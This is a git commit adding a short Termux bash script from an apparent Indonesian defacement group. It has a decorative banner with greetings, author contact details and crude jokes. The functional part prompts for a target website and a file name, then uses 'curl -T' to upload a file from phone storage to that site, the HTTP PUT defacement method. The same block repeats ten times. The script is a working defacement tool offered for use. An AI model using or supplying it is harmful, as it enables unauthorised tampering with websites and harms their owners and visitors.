a960656fdcb4c131b22061612990de1c8c8f8962
Droid <39285561+droidxerror123@users.noreply.github.com>
2018-07-22 10:46:03 +0000

    def-09

---
+++ fahri.sh
@@ -0,0 +1,94 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#mau apa njing!1!1!
+#recode auto gelud
+#gua Gans lu buriq
+clear
+
+sleep 1
+toilet -f shadow -F gay  "T.DEF09"
+echo ""
+echo """
+\033[33;1m             Thanks To Allah SWT
+\033[34;1m                  grets to :
+ \033[36;1m  Anonymous Jember || Indonesian Fighter Cyber
+  Indonesia Cyber Army || Pemalang Security Lite ||
+  Fox Cyber || Invinity Cyber Team || Not Found Cyber Team ||Indonesian Coder Team ||                                 
+\033[34;1m                  Friends :
+\033[36;1m   Rifqy ken || Chilay || Ryan || Tiyo || ItsZnine7 || Te9e Cyber
+   Nizar Fadlan || Dedi Darmadi || Fake System || Mr.Catur ||
+   ROBOSKIjr 404 || ZET404 || Mr.4C3N9 || GrimX72 || 
+\033[34;1m            special thanks to : """
+echo "\033[36;1m   Mr.Stering & Hanako San"
+echo "\033[33;1m"
+echo -n  """
+<={------------------------------------------------------------------------------}=>
+                                     --------------------------
+        -------------------          | Deface Mulu            |
+        |                 |          | Kapan Cari Pacarnya??? |
+        |  -------------  |          --------------------------
+        | |  --     --  | |
+        | |   ∆     ∆   | |
+        | |     ___     | |
+        | |             | |   <={---------------------------------------------}=
+        |  -------------  |      = author = ./FAHRI X Error Cyber            =
+         _________________       =-------------------------------------------=
+              |     |            = WA     = +6289606402413                   =
+        ------------------       = Date   = 21-07-2018                       =
+       /    Fahri Gans    \      = blog   = indonesiansechunter.blogspot.com =
+      / ################## \  <={---------------------------------------------}=>
+      ---------------------- """
+echo ""
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script: "  script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo ""
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script: "  script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo "\033[34;1m"
+read -p "website:"  website
+read -p "script:"   script
+curl -T /storage/emulated/0/$script $website
+echo  "\033[92;1m = $website/$script "
+echo """
+Terima Kasih Telah Menggunakan Tools Ini
+5Sampai Jumpa Dilain Waktu :)"""
